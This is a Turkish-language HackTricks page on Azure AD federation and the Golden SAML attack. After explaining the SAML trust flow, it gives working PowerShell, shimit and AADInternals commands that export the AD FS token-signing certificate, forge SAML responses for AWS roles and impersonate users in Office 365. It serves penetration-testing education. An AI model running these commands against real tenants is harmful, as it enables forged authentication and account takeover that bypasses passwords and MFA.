# Az - Federation

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub depolarına.

</details>
{% endhint %}

## Temel Bilgiler

[Belgelerden:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation** bir **güven** oluşturmuş **alanlar** topluluğudur. Güven seviyesi değişebilir, ancak genellikle **kimlik doğrulama** ve neredeyse her zaman **yetkilendirme** içerir. Tipik bir federasyon, **paylaşılan kaynaklara erişim** için **güven** oluşturmuş **bir dizi organizasyonu** içerebilir.

**Yerel ortamınızı Azure AD ile federasyon** yapabilir ve bu federasyonu kimlik doğrulama ve yetkilendirme için kullanabilirsiniz. Bu oturum açma yöntemi, tüm kullanıcı **kimlik doğrulamasının yerel ortamda** gerçekleşmesini sağlar. Bu yöntem, yöneticilerin daha katı erişim kontrol seviyeleri uygulamasına olanak tanır. **AD FS** ve PingFederate ile federasyon mümkündür.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Temel olarak, Federasyon'da tüm **kimlik doğrulama** **yerel ortamda** gerçekleşir ve kullanıcı, tüm güvenilir ortamlarda SSO deneyimi yaşar. Bu nedenle, kullanıcılar **yerel kimlik bilgilerini** kullanarak **bulut** uygulamalarına **erişebilirler**.

**Security Assertion Markup Language (SAML)**, sağlayıcılar arasında tüm kimlik doğrulama ve yetkilendirme **bilgilerini** **değiştirmek** için kullanılır.

Herhangi bir federasyon kurulumunda üç taraf vardır:

* Kullanıcı veya İstemci
* Kimlik Sağlayıcı (IdP)
* Hizmet Sağlayıcı (SP)

(Görseller https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps adresinden alınmıştır)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. Başlangıçta, bir kullanıcı bir uygulamaya (Hizmet Sağlayıcı veya SP, örneğin AWS konsolu veya vSphere web istemcisi) erişir. Bu adım atlanabilir ve istemci doğrudan IdP'ye (Kimlik Sağlayıcı) yönlendirilebilir, bu belirli uygulamaya bağlıdır.
2. Daha sonra, SP kullanıcı kimlik doğrulaması için uygun IdP'yi (örneğin, AD FS, Okta) belirler. Bir SAML (Security Assertion Markup Language) AuthnRequest oluşturur ve istemciyi seçilen IdP'ye yönlendirir.
3. IdP devralır ve kullanıcıyı kimlik doğrular. Kimlik doğrulama sonrası, IdP tarafından bir SAMLResponse oluşturulur ve kullanıcı aracılığıyla SP'ye iletilir.
4. Son olarak, SP SAMLResponse'u değerlendirir. Başarıyla doğrulanırsa, IdP ile bir güven ilişkisi olduğunu ima eder ve kullanıcıya erişim izni verir. Bu, oturum açma sürecinin tamamlandığını ve kullanıcının hizmeti kullanabileceğini gösterir.

**SAML kimlik doğrulaması ve yaygın saldırılar hakkında daha fazla bilgi edinmek istiyorsanız:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS, iddia tabanlı bir kimlik modelidir.
* "..iddialar, kullanıcılar hakkında yapılan ve esas olarak internet üzerindeki herhangi bir yerde bulunan iddia tabanlı uygulamalara erişimi yetkilendirmek için kullanılan basit ifadeler (örneğin, ad, kimlik, grup) dir."
* Bir kullanıcı için iddialar SAML belirteçlerine yazılır ve ardından IdP tarafından gizlilik sağlamak için imzalanır.
* Bir kullanıcı ImmutableID ile tanımlanır. Bu, küresel olarak benzersizdir ve Azure AD'de saklanır.
* ImmutableID, kullanıcı için yerel ortamda ms-DS-ConsistencyGuid olarak saklanır ve/veya kullanıcının GUID'sinden türetilebilir.
* Daha fazla bilgi için [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML saldırısı:**

* ADFS'de, SAML Yanıtı bir belirteç imzalama sertifikası ile imzalanır.
* Sertifika ele geçirilirse, Azure AD'ye Azure AD'ye senkronize edilmiş HERHANGİ bir kullanıcı olarak kimlik doğrulaması yapmak mümkündür!
* PTA kötüye kullanımı gibi, bir kullanıcının şifresini değiştirmek veya MFA, kimlik doğrulama yanıtını sahte olarak oluşturduğumuz için hiçbir etkisi olmayacaktır.
* Sertifika, DA ayrıcalıkları ile AD FS sunucusundan çıkarılabilir ve ardından internet bağlantılı herhangi bir makineden kullanılabilir.
* Daha fazla bilgi için [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Bir **Kimlik Sağlayıcı (IdP)**'nin kullanıcı oturum açma yetkisi vermek için bir **SAMLResponse** üretme süreci çok önemlidir. IdP'nin belirli uygulamasına bağlı olarak, **yanıt** **imzalanabilir** veya **şifrelenebilir** ve **IdP'nin özel anahtarı** kullanılarak yapılır. Bu prosedür, **Hizmet Sağlayıcı (SP)**'nin SAMLResponse'un doğruluğunu onaylamasını sağlar ve bunun gerçekten güvenilir bir IdP tarafından verildiğini garanti eder.

[Golden ticket saldırısı](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) ile paralellik kurulabilir, burada kullanıcının kimliğini ve izinlerini doğrulayan anahtar (golden ticket için KRBTGT, golden SAML için belirteç imzalama özel anahtarı) manipüle edilerek **kimlik doğrulama nesnesi** (TGT veya SAMLResponse) sahte olarak oluşturulabilir. Bu, herhangi bir kullanıcının taklit edilmesine ve SP'ye yetkisiz erişim sağlanmasına olanak tanır.

Golden SAML'ler bazı avantajlar sunar:

* **Uzaktan oluşturulabilirler**, ilgili alan veya federasyonun bir parçası olmaya gerek kalmadan.
* **İki Faktörlü Kimlik Doğrulama (2FA)** etkin olsa bile etkili kalırlar.
* Belirteç imzalama **özel anahtarı otomatik olarak yenilenmez**.
* **Bir kullanıcının şifresini değiştirmek**, zaten oluşturulmuş bir SAML'i geçersiz kılmaz.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) Microsoft'un, güvenilir iş ortakları (federasyon) arasında **kimlik bilgilerini güvenli bir şekilde değiş tokuş etmeyi** sağlayan bir hizmetidir. Esasen, bir alan hizmetinin federasyon içindeki diğer hizmet sağlayıcılarla kullanıcı kimliklerini paylaşmasına olanak tanır.

AWS'nin ele geçirilmiş alana (bir federasyonda) güvenmesiyle, bu güvenlik açığı, AWS ortamında **herhangi bir izin elde etmek** için kullanılabilir. Saldırı, SAML nesnelerini imzalamak için kullanılan **özel anahtarı** gerektirir, tıpkı golden ticket saldırısında KRBTGT'ye ihtiyaç duyulduğu gibi. Bu özel anahtarı elde etmek için AD FS kullanıcı hesabına erişim yeterlidir.

Golden SAML saldırısını gerçekleştirmek için gerekenler:

* **Belirteç imzalama özel anahtarı**
* **IdP genel sertifikası**
* **IdP adı**
* **Rol adı (üstlenilecek rol)**
* Domain\kullanıcı adı
* AWS'de rol oturum adı
* Amazon hesap kimliği

_Yalnızca kalın yazılan öğeler zorunludur. Diğerleri istenildiği gibi doldurulabilir._

**Özel anahtarı** elde etmek için **AD FS kullanıcı hesabına** erişim gereklidir. Buradan, özel anahtar **kişisel depodan** [mimikatz](https://github.com/gentilkiwi/mimikatz) gibi araçlar kullanılarak dışa aktarılabilir. Diğer gerekli bilgileri toplamak için, ADFS kullanıcısı olarak oturum açtığınızdan emin olarak Microsoft.Adfs.Powershell snapin'i şu şekilde kullanabilirsiniz:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Tüm bilgilerle, [**shimit**](https://github.com/cyberark/shimit)**'i kullanarak taklit etmek istediğiniz kullanıcı olarak geçerli bir SAMLResponse'u unutmak mümkündür:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Bulut yalnız kullanıcılarının ImmutableID'sini oluşturmak ve onları taklit etmek de mümkündür.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Referanslar

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS Hacking öğren & pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğren & pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek hacking ipuçlarını paylaşın.

</details>
{% endhint %}
